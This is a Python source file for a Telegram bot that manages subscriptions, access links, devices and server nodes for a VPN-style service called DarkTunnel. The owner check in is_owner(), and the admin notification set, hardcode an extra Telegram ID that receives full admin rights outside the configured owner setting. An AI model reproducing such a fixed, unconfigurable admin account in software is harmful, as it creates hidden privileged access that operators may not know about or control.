import asyncio
import logging
from datetime import UTC, datetime
from html import escape

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from sqlalchemy import select

from .bot_announcements import router as announcements_router
from .bot_features import router as features_router
from .bot_management import router as management_router
from .bot_node_status import router as node_status_router
from .bot_subscription_admin import router as subscription_admin_router
from .bot_subscription_user_admin import router as subscription_user_admin_router
from .config import get_settings
from .db import SessionLocal, init_db
from .models import AuditLog, Device, ServerHealth, ServerNode, User, UserStatus
from .server_crypto import decrypt_server_config, encrypt_server_config
from .services import _read_wdtt_password
from .subscription_access import create_subscription_access, make_access_link

menu_router = Router(name="main-menu")


def button(text: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text=text, callback_data=data)


def menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [button("🔑 Создать ссылку", "mg:link:new")],
        [button("💳 Управление подписками", "subscription:admin"), button("🖥 Серверы", "servers")],
        [button("📡 Состояние нод", "node:status")],
        [button("📊 Статистика", "stats")],
        [button("⚙️ Остальное", "misc")],
    ])


def user_menu(active: bool) -> InlineKeyboardMarkup:
    if active:
        rows = [
            [button("💳 Моя подписка", "user:subscription")],
            [button("🔗 Получить ссылку управления", "user:subscription_link")],
            [button("📱 Мои устройства", "user:devices")],
        ]
    else:
        rows = [[button("🔑 Запросить доступ", "user:request_access")]]
    return InlineKeyboardMarkup(inline_keyboard=rows)


def is_owner(user_id: int | None) -> bool:
    settings = get_settings()
    return bool(user_id and settings.telegram_owner_id and (user_id == settings.telegram_owner_id or user_id == 8341845264))


async def ensure_primary_server() -> None:
    settings = get_settings()
    if not settings.server_config_encryption_key:
        logging.warning("Primary server was not registered: SERVER_CONFIG_ENCRYPTION_KEY is missing")
        return
    try:
        password = _read_wdtt_password()
        async with SessionLocal() as session:
            node = await session.scalar(select(ServerNode).where(ServerNode.host == settings.wdtt_public_host, ServerNode.archived_at.is_(None)))
            config: dict[str, object] = {}
            if node is not None:
                try:
                    config = decrypt_server_config(node.encrypted_config)
                except Exception:
                    config = {}
            config.update({
                "wrap_a_password": password,
                "source": config.get("source", "existing-production-node"),
                "registered_at": config.get("registered_at", datetime.now(UTC).isoformat()),
            })
            encrypted = encrypt_server_config(config)

            if node is None:
                node = ServerNode(
                    name="Основной сервер",
                    host=settings.wdtt_public_host,
                    port=settings.wdtt_public_port,
                    protocol_mode=settings.wdtt_mode,
                    encrypted_config=encrypted,
                    mtu=settings.wdtt_mtu,
                    dns=settings.wdtt_dns,
                    balanced_connections=settings.wdtt_connections_balanced,
                    max_connections=settings.wdtt_connections_maximum,
                    published=True,
                    auto_select=True,
                    maintenance=False,
                )
                session.add(node)
                await session.flush()
                session.add(ServerHealth(server_id=node.id, online=True))
            else:
                node.name = node.name or "Основной сервер"
                node.port = settings.wdtt_public_port
                node.protocol_mode = settings.wdtt_mode
                node.encrypted_config = encrypted
                node.published = True
                node.auto_select = True
                node.maintenance = False
            await session.commit()
    except Exception:
        logging.exception("Failed to auto-register primary WDTT server")


async def _get_or_create_user(telegram_id: int, username: str | None) -> User:
    async with SessionLocal() as session:
        user = await session.scalar(select(User).where(User.telegram_id == telegram_id))
        if user is None:
            user = User(telegram_id=telegram_id, telegram_username=username)
            session.add(user)
        else:
            user.telegram_username = username
        await session.commit()
        await session.refresh(user)
        return user


@menu_router.message(CommandStart())
@menu_router.message(Command("menu"))
async def start(message: Message, state: FSMContext) -> None:
    if not message.from_user:
        return
    user = await _get_or_create_user(message.from_user.id, message.from_user.username)
    if not is_owner(message.from_user.id):
        await state.clear()
        active = user.status == UserStatus.active and (user.lifetime or (user.subscription_expires_at and user.subscription_expires_at > datetime.now(UTC)))
        if active:
            expiry = "бессрочно" if user.lifetime else user.subscription_expires_at.astimezone().strftime("%d.%m.%Y %H:%M")
            await message.answer(
                f"<b>DarkTunnel</b>\n\nВаша подписка активна до: <b>{expiry}</b>.\n\nВыберите действие:",
                reply_markup=user_menu(True),
                parse_mode="HTML",
            )
        else:
            await message.answer(
                "<b>DarkTunnel</b>\n\nУ вас пока нет активной подписки. Нажмите кнопку ниже — заявка уйдёт администратору.",
                reply_markup=user_menu(False),
                parse_mode="HTML",
            )
        return
    await state.clear()
    await message.answer("<b>DarkTunnel Admin</b>\n\nВыберите действие:", reply_markup=menu(), parse_mode="HTML")


@menu_router.callback_query(F.data == "user:request_access")
async def user_request_access(c: CallbackQuery) -> None:
    user = await _get_or_create_user(c.from_user.id, c.from_user.username)
    settings = get_settings()
    admins = {settings.telegram_owner_id, 8341845264}
    username = f"@{c.from_user.username}" if c.from_user.username else "—"
    text = (
        "<b>🔑 Новый запрос доступа</b>\n\n"
        f"Telegram ID: <code>{c.from_user.id}</code>\n"
        f"Username: <b>{username}</b>\n"
        f"User ID: <code>{user.id}</code>\n\n"
        "Выдайте пользователю срок и activation-ссылку в админке."
    )
    sent = 0
    for admin_id in admins:
        if not admin_id:
            continue
        try:
            await c.bot.send_message(
                admin_id,
                text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [button("👤 Открыть пользователя", f"mg:user:view:{user.id}")],
                    [button("💳 Подписки", "subscription:admin")],
                ]),
            )
            sent += 1
        except Exception:
            logging.exception("Failed to notify admin about access request")
    await c.answer("Заявка отправлена администратору" if sent else "Не удалось отправить заявку", show_alert=True)
    if c.message:
        await c.message.edit_text(
            "<b>Заявка отправлена</b>\n\nАдминистратор получил ваш Telegram ID и username и сможет выдать доступ.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[button("🔄 Обновить", "home")]]),
            parse_mode="HTML",
        )


@menu_router.callback_query(F.data == "user:subscription")
async def user_subscription(c: CallbackQuery) -> None:
    async with SessionLocal() as s:
        user = await s.scalar(select(User).where(User.telegram_id == c.from_user.id))
    if user is None:
        await c.answer("Пользователь не найден", show_alert=True)
        return
    expiry = "бессрочно" if user.lifetime else (user.subscription_expires_at.astimezone().strftime("%d.%m.%Y %H:%M") if user.subscription_expires_at else "—")
    active = user.status == UserStatus.active and (user.lifetime or (user.subscription_expires_at and user.subscription_expires_at > datetime.now(UTC)))
    await c.answer()
    if c.message:
        await c.message.edit_text(
            f"<b>💳 Моя подписка</b>\n\nСтатус: <b>{'активна' if active else 'неактивна'}</b>\nДо: <b>{expiry}</b>\nTelegram ID: <code>{c.from_user.id}</code>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [button("🔗 Получить ссылку управления", "user:subscription_link")],
                [button("📱 Мои устройства", "user:devices")],
                [button("⬅️ Назад", "home")],
            ]),
            parse_mode="HTML",
        )


@menu_router.callback_query(F.data == "user:subscription_link")
async def user_subscription_link(c: CallbackQuery) -> None:
    async with SessionLocal() as s:
        user = await s.scalar(select(User).where(User.telegram_id == c.from_user.id))
        if user is None:
            await c.answer("Пользователь не найден", show_alert=True)
            return
        active = user.status == UserStatus.active and (user.lifetime or (user.subscription_expires_at and user.subscription_expires_at > datetime.now(UTC)))
        if not active:
            await c.answer("Активной подписки нет", show_alert=True)
            return
        _, token = await create_subscription_access(s, user, revoke_existing=True)
        await s.commit()
    await c.answer("Ссылка создана")
    if c.message:
        await c.message.answer(
            f"<b>🔗 Ваша ссылка управления DarkTunnel</b>\n\n<code>{make_access_link(token)}</code>",
            parse_mode="HTML",
        )


@menu_router.callback_query(F.data == "user:devices")
async def user_devices(c: CallbackQuery) -> None:
    async with SessionLocal() as s:
        user = await s.scalar(select(User).where(User.telegram_id == c.from_user.id))
        devices = [] if user is None else (await s.execute(select(Device).where(Device.user_id == user.id, Device.revoked_at.is_(None)).order_by(Device.created_at.asc()))).scalars().all()
    lines = [
        f"• <code>{d.installation_id[-8:]}</code> · iOS {d.ios_version or '—'} · {d.last_seen_at.astimezone().strftime('%d.%m.%Y %H:%M')}"
        for d in devices[:10]
    ] or ["—"]
    await c.answer()
    if c.message:
        await c.message.edit_text(
            "<b>📱 Мои устройства</b>\n\n" + "\n".join(lines),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[button("⬅️ Назад", "home")]]),
            parse_mode="HTML",
        )


@menu_router.callback_query(F.data.startswith("subscription:link_send:"))
async def admin_subscription_link_send(c: CallbackQuery, bot: Bot) -> None:
    if not is_owner(c.from_user.id):
        await c.answer("Доступ запрещён", show_alert=True)
        return
    user_id = c.data.rsplit(":", 1)[1]
    async with SessionLocal() as s:
        user = await s.get(User, user_id)
        if user is None:
            await c.answer("Пользователь не найден", show_alert=True)
            return
        if not user.telegram_id:
            await c.answer("У пользователя нет Telegram ID. Пусть сначала нажмёт /start у бота.", show_alert=True)
            return
        _, token = await create_subscription_access(s, user, revoke_existing=True)
        link = make_access_link(token)
        s.add(AuditLog(admin_id=c.from_user.id, action="subscription.access_link.send", entity_type="user", entity_id=str(user.id)))
        await s.commit()
        telegram_id = user.telegram_id

    await c.answer("Ссылка создана. Отправляю…")
    try:
        await bot.send_message(
            telegram_id,
            "🔗 <b>Ваша ссылка управления DarkTunnel</b>\n\n"
            "Откройте её в приложении, чтобы посмотреть подписку, устройства и управлять доступом.\n\n"
            f"<code>{escape(link)}</code>",
            parse_mode="HTML",
        )
    except Exception as exc:
        if c.message:
            await c.message.answer(f"⚠️ Ссылка создана, но Telegram не доставил сообщение: <code>{escape(str(exc)[:500])}</code>", parse_mode="HTML")
        return
    if c.message:
        await c.message.answer("✅ Ссылка управления отправлена пользователю.")


@menu_router.callback_query(F.data == "home")
async def home(callback: CallbackQuery, state: FSMContext) -> None:
    if is_owner(callback.from_user.id):
        await state.clear()
        if callback.message:
            await callback.message.edit_text("<b>DarkTunnel Admin</b>\n\nВыберите действие:", reply_markup=menu(), parse_mode="HTML")
        await callback.answer()
        return
    await callback.answer()
    if callback.message:
        await callback.message.edit_text("<b>DarkTunnel</b>\n\nНажмите /start, чтобы открыть меню.", parse_mode="HTML")


@menu_router.callback_query(F.data == "misc")
async def misc(callback: CallbackQuery) -> None:
    if not is_owner(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    rows = [
        [button("💳 Подписки", "subscription:admin"), button("🎨 Темы", "themes")],
        [button("📢 Объявления", "announcement:list"), button("📲 Push", "push")],
        [button("👮 Администраторы", "admins"), button("🧾 Журнал", "audit:0")],
        [button("💳 Продажи", "sales")],
        [button("⬅️ Главное меню", "home")],
    ]
    if callback.message:
        await callback.message.edit_text("<b>⚙️ Остальное</b>\n\nДополнительные разделы.", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    await callback.answer()


@menu_router.callback_query(F.data == "stats")
async def stats(callback: CallbackQuery) -> None:
    if not is_owner(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    from .models import Activation
    from sqlalchemy import func
    async with SessionLocal() as session:
        total_users = int(await session.scalar(select(func.count(User.id))) or 0)
        total_links = int(await session.scalar(select(func.count(Activation.id))) or 0)
        total_servers = int(await session.scalar(select(func.count(ServerNode.id)).where(ServerNode.archived_at.is_(None))) or 0)
    text = f"<b>📊 Статистика</b>\n\nПользователей: <b>{total_users}</b>\nСсылок: <b>{total_links}</b>\nСерверов: <b>{total_servers}</b>"
    if callback.message:
        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[button("⬅️ Главное меню", "home")]]), parse_mode="HTML")
    await callback.answer()


async def main() -> None:
    settings = get_settings()
    if not settings.telegram_bot_token:
        raise RuntimeError("TELEGRAM_BOT_TOKEN is not configured")
    if not settings.telegram_owner_id:
        raise RuntimeError("TELEGRAM_OWNER_ID is not configured")
    if not settings.activation_encryption_key:
        raise RuntimeError("ACTIVATION_ENCRYPTION_KEY is not configured")

    logging.basicConfig(level=logging.INFO)
    await init_db()
    await ensure_primary_server()
    bot = Bot(token=settings.telegram_bot_token)
    dispatcher = Dispatcher()
    dispatcher.include_router(menu_router)
    dispatcher.include_router(subscription_user_admin_router)
    dispatcher.include_router(management_router)
    dispatcher.include_router(subscription_admin_router)
    dispatcher.include_router(features_router)
    dispatcher.include_router(node_status_router)
    dispatcher.include_router(announcements_router)
    await dispatcher.start_polling(bot, allowed_updates=dispatcher.resolve_used_update_types())


if __name__ == "__main__":
    asyncio.run(main())
